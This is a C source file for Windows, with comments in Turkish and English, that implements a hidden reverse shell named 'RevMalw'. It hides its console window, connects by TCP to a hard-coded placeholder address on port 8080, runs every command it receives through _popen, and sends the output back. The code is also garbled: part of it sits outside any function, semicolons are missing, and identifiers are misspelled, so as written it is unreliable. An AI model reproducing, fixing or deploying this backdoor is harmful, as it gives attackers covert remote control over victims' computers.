// main headers

#include <winsock2.h> // socket baglantısı - socket connection
#include <windows.h> // WinApi cagrısı -  WinApi calls
#include <ws2tcpip.h> // tcp-ip socketi

#include <stdio.h> // C giris/cıkıs - C input/output

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

int main() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
    RevMalw();
    return 0;
}

void exec(char* returnval, int returnsize, const char *command) {
    FILE* fp;
    char buffer[DEFAULT_BUFLEN];

    if ((fp = _popen(command, "r")) == NULL) {
        snprintf(returnval, returnsize, "[x] Bir hata oluştu / Error executing command...\n");
        return;
    }

    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        strcat(returnval, buffer);
    }

    _pclose(fp);
}

void RevMalw() {
    WSDATA wsaver;
    WSAStartup(MAKEWORD(2, 2) &answer);

    SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPRO_TCP);

    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("192.168.x.x") // set the ip address(target's)
    addr.sin_port = htons(8080); // set the port number(target's)
}

if (connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR){
    closesocket(tcpsock);
    WSACleanup();
    exit(0);
} else {
    char CommandReceived[DEFAULT_BUFLEN] = ""
    while (true) {
        int Result = recv(tcpsock, CommandReceived, DEFAULT_BUFLEN, 0);
        if (Result <= 0) {
            break;
        }
        CommandReceived[Result] = '\0'; 

        char buffer[DEFAULT_BUFLEN] = "";
        exec(buffer, sizeof(buffer), CommandReceived);
        send(tcpsock, buffer, strlen(buffer), 0);

        memset(CommandReceived, 0, sizeof(CommandReceived));
    }
    closesocket(tcpsock);
    WSACleanup();
    return 0;
}


